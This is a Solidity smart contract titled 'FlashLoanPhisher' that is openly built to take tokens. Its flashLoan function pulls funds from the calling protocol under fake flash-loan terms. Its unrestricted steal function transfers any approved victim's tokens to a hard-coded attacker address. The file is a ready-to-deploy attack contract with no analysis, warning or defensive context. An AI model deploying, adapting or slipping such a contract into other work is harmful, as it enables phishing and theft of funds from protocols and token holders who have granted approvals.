// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IFlashBorrower {
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
}

/// @title FlashLoanPhisher - Traps protocols into sending funds under fake flash loan terms
contract FlashLoanPhisher {
    address public attacker;
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function flashLoan(
        address receiver,
        address token,
        uint256 amount
    ) external returns (bool) {
        // Phish by forcing transferFrom from protocol
        IERC20(token).transferFrom(msg.sender, receiver, amount);

        // Execute borrower's callback
        bytes memory data = abi.encode("fake");
        IFlashBorrower(receiver).onFlashLoan(msg.sender, token, amount, 0, data);

        return true;
    }

    function steal(address token, address victim, uint256 amount) external {
        IERC20(token).transferFrom(victim, attacker, amount);
    }
}
